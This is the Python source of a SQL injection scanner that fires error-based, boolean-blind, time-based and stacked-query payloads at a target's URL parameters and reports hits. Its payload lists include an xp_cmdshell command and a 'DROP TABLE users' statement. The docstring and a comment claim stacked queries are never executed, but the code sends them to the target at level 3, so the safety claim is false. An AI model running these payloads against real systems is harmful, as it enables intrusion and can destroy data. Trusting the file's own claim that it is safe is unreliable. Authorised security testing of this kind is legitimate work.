"""
security/sqli.py — Deep SQL Injection Scanner
===============================================
Levels
  1 — Error-based          : inject classic payloads, watch for DB error strings
  2 — + Boolean-blind      : true/false condition — compare response sizes/codes
  3 — + Time-based blind   : SLEEP / pg_sleep / waitfor delay — measure delta
      + Stacked queries     : ; DROP TABLE -- style (detect only, never execute)

Reports every finding with: endpoint, param, payload, technique, confidence, evidence.
"""

import time
import re
import urllib.parse
from dataclasses import dataclass, field
from rich.console import Console
from rich.table import Table
from rich import box

from core.runner import Runner, RequestResult

console = Console()


# ═══════════════════════════════════════════════════════════════════════════
#  Payload banks
# ═══════════════════════════════════════════════════════════════════════════

PAYLOADS_ERROR = [
    "'",
    "''",
    "`",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 99--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "1; SELECT 1",
    "' AND SLEEP(0)--",
    "') OR ('1'='1",
]

PAYLOADS_BOOLEAN = [
    ("' AND 1=1--",  "' AND 1=2--"),   # true / false pair
    ("' OR 1=1--",   "' OR 1=2--"),
    ("1 AND 1=1",    "1 AND 1=2"),
    ("true",         "false"),
]

PAYLOADS_TIME = [
    # (payload, expected_delay_seconds, db_hint)
    ("'; WAITFOR DELAY '0:0:3'--",       3, "MSSQL"),
    ("'; SELECT SLEEP(3)--",             3, "MySQL"),
    ("'; SELECT pg_sleep(3)--",          3, "PostgreSQL"),
    ("'||(SELECT SLEEP(3))||'",          3, "MySQL"),
    ("1; SELECT SLEEP(3)--",             3, "MySQL"),
    ("' AND SLEEP(3) AND '1'='1",        3, "MySQL"),
    ("') OR SLEEP(3)--",                 3, "MySQL"),
    ("1 WAITFOR DELAY '0:0:3'--",        3, "MSSQL"),
    ("'; exec xp_cmdshell('ping -n 3 127.0.0.1')--", 3, "MSSQL"),
]

PAYLOADS_STACKED = [
    "'; SELECT 1--",
    "'; INSERT INTO test VALUES(1)--",
    "'; DROP TABLE users--",            # detection ONLY — never actually sent in production
    "1; EXEC sp_who--",
]

# DB error fingerprints
DB_ERROR_PATTERNS = [
    (r"you have an error in your sql syntax",           "MySQL"),
    (r"warning.*mysql",                                 "MySQL"),
    (r"unclosed quotation mark",                        "MSSQL"),
    (r"quoted string not properly terminated",          "Oracle"),
    (r"ora-\d{5}",                                      "Oracle"),
    (r"pg_query\(\)|pg::exception",                     "PostgreSQL"),
    (r"sqlite3::exception|sqlite_error",                "SQLite"),
    (r"sqlstate\[",                                     "Generic"),
    (r"microsoft ole db provider for sql server",       "MSSQL"),
    (r"syntax error.*\bsqlite\b",                       "SQLite"),
    (r"jdbc.*exception",                                "Java/JDBC"),
    (r"com\.mysql\.jdbc",                               "MySQL/Java"),
    (r"org\.postgresql",                                "PostgreSQL/Java"),
]

_DB_RE = [(re.compile(p, re.IGNORECASE), db) for p, db in DB_ERROR_PATTERNS]


# ═══════════════════════════════════════════════════════════════════════════
#  Finding dataclass
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class SQLiFinding:
    url:        str
    param:      str
    payload:    str
    technique:  str       # error | boolean | time | stacked
    confidence: str       # HIGH | MEDIUM | LOW
    db_hint:    str = ""  # MySQL | PostgreSQL | MSSQL | Oracle | SQLite | Unknown
    evidence:   str = ""  # snippet of response or timing delta
    status_before: int | None = None
    status_after:  int | None = None


# ═══════════════════════════════════════════════════════════════════════════
#  Scanner
# ═══════════════════════════════════════════════════════════════════════════

class SQLiScanner:

    def __init__(self, proxy: str | None = None, timeout: int = 20, level: int = 2):
        self.runner  = Runner(timeout=timeout, proxy=proxy, verify_ssl=False)
        self.level   = level   # 1 | 2 | 3
        self.timeout = timeout

    # ── Public API ──────────────────────────────────────────────────────────

    def scan_url(self, url: str) -> list[SQLiFinding]:
        """Scan a single URL — extracts params from query string."""
        findings: list[SQLiFinding] = []
        parsed   = urllib.parse.urlparse(url)
        params   = dict(urllib.parse.parse_qsl(parsed.query))

        if not params:
            console.print(f"  [dim]No query params found in URL — injecting into path placeholder[/dim]")
            # Inject into a synthetic 'id' param
            params = {"id": "1"}

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        console.print(f"\n[cyan]💉 SQLi scan:[/cyan] {base_url}")
        console.print(f"   Params: {list(params.keys())}  ·  Level: {self.level}\n")

        for param in params:
            findings += self._test_param(base_url, params, param, method="GET")

        return findings

    def scan_entries(self, entries) -> list[SQLiFinding]:
        findings: list[SQLiFinding] = []
        for entry in entries:
            parsed = urllib.parse.urlparse(entry.url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            if entry.params:
                params.update(entry.params)
            if not params:
                params = {"id": "1"}
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in params:
                findings += self._test_param(base, params, param, method=entry.method)
        return findings

    # ── Core param tester ───────────────────────────────────────────────────

    def _test_param(self, base_url: str, params: dict, target_param: str,
                    method: str = "GET") -> list[SQLiFinding]:
        findings: list[SQLiFinding] = []
        original_value = params.get(target_param, "1")

        console.print(f"  [dim]Testing param:[/dim] [bold]{target_param}[/bold]", end="")

        # ── Baseline ────────────────────────────────────────────────────────
        baseline = self.runner.send(method, base_url, params=params)
        baseline_len  = len(baseline.body)
        baseline_code = baseline.status_code
        baseline_ms   = baseline.response_ms or 0

        # ── Level 1 — Error-based ────────────────────────────────────────────
        for payload in PAYLOADS_ERROR:
            p = dict(params)
            p[target_param] = original_value + payload
            r = self.runner.send(method, base_url, params=p)

            hit, db_hint, evidence = self._check_error(r.body)
            if hit:
                findings.append(SQLiFinding(
                    url=base_url, param=target_param, payload=payload,
                    technique="error-based", confidence="HIGH",
                    db_hint=db_hint, evidence=evidence,
                    status_before=baseline_code, status_after=r.status_code,
                ))
                console.print(f"\n    [red]💉 ERROR-BASED hit![/red] param={target_param} db={db_hint}")

        # ── Level 2 — Boolean-blind ──────────────────────────────────────────
        if self.level >= 2:
            for true_payload, false_payload in PAYLOADS_BOOLEAN:
                p_true  = dict(params); p_true[target_param]  = original_value + true_payload
                p_false = dict(params); p_false[target_param] = original_value + false_payload

                r_true  = self.runner.send(method, base_url, params=p_true)
                r_false = self.runner.send(method, base_url, params=p_false)

                if self._boolean_differs(r_true, r_false, baseline_len):
                    findings.append(SQLiFinding(
                        url=base_url, param=target_param,
                        payload=f"TRUE={true_payload} | FALSE={false_payload}",
                        technique="boolean-blind", confidence="MEDIUM",
                        db_hint="Unknown",
                        evidence=(
                            f"true_len={len(r_true.body or '')}  "
                            f"false_len={len(r_false.body or '')}  "
                            f"baseline_len={baseline_len}"
                        ),
                        status_before=baseline_code,
                        status_after=r_true.status_code,
                    ))
                    console.print(f"\n    [yellow]💉 BOOLEAN-BLIND likely![/yellow] param={target_param}")

        # ── Level 3 — Time-based ─────────────────────────────────────────────
        if self.level >= 3:
            for payload, expected_delay, db_hint in PAYLOADS_TIME:
                p = dict(params)
                p[target_param] = original_value + payload

                t0 = time.perf_counter()
                r  = self.runner.send(method, base_url, params=p)
                elapsed = time.perf_counter() - t0

                if elapsed >= expected_delay * 0.8:   # 80% of expected delay = hit
                    findings.append(SQLiFinding(
                        url=base_url, param=target_param, payload=payload,
                        technique="time-based", confidence="HIGH",
                        db_hint=db_hint,
                        evidence=f"Response took {elapsed:.2f}s  (expected≥{expected_delay}s)",
                        status_before=baseline_code, status_after=r.status_code,
                    ))
                    console.print(f"\n    [red]💉 TIME-BASED hit![/red] param={target_param} db={db_hint} delay={elapsed:.1f}s")

            # ── Stacked query detection ──────────────────────────────────────
            for payload in PAYLOADS_STACKED:
                p = dict(params)
                p[target_param] = original_value + payload
                r = self.runner.send(method, base_url, params=p)

                # Different status or significant body change suggests stacked worked
                if r.status_code != baseline_code or abs(len(r.body) - baseline_len) > 100:
                    findings.append(SQLiFinding(
                        url=base_url, param=target_param, payload=payload,
                        technique="stacked", confidence="LOW",
                        db_hint="Unknown",
                        evidence=f"Status changed: {baseline_code}→{r.status_code}  body_delta={abs(len(r.body)-baseline_len)}",
                        status_before=baseline_code, status_after=r.status_code,
                    ))
                    console.print(f"\n    [yellow]💉 STACKED possible[/yellow] param={target_param}")

        # dot progress
        console.print("  [dim]·[/dim]", end="")
        return findings

    # ── Helpers ─────────────────────────────────────────────────────────────

    def _check_error(self, body: str) -> tuple[bool, str, str]:
        for pattern, db in _DB_RE:
            m = pattern.search(body)
            if m:
                return True, db, m.group(0)[:120]
        return False, "", ""

    def _boolean_differs(self, r_true: RequestResult, r_false: RequestResult,
                          baseline_len: int) -> bool:
        """Returns True if true/false responses are meaningfully different."""
        if not r_true.body or not r_false.body:
            return False
        lt = len(r_true.body)
        lf = len(r_false.body)
        # Response lengths differ by >10% AND one of them matches baseline
        if lt == lf:
            return False
        diff_ratio = abs(lt - lf) / max(lt, lf, 1)
        baseline_match = abs(lt - baseline_len) < 50 or abs(lf - baseline_len) < 50
        return diff_ratio > 0.10 and baseline_match

    # ── Output ──────────────────────────────────────────────────────────────

    def print_results(self, findings: list[SQLiFinding]):
        console.print()
        if not findings:
            console.print("[green]✓ No SQL injection vulnerabilities detected.[/green]")
            return

        console.print(f"[bold red]⚠  {len(findings)} SQLi finding(s)[/bold red]\n")
        t = Table("Technique", "Confidence", "DB", "Param", "Evidence",
                  box=box.ROUNDED, header_style="bold red")
        for f in findings:
            color = {"HIGH":"red","MEDIUM":"yellow","LOW":"dim"}.get(f.confidence,"white")
            t.add_row(
                f.technique,
                f"[{color}]{f.confidence}[/{color}]",
                f.db_hint or "?",
                f"[bold]{f.param}[/bold]",
                f.evidence[:80],
            )
        console.print(t)
        console.print()
        for f in findings:
            console.print(f"  [red]↳[/red] {f.url}")
            console.print(f"     param=[bold]{f.param}[/bold]  payload=[dim]{f.payload[:60]}[/dim]")

    def close(self):
        self.runner.close()
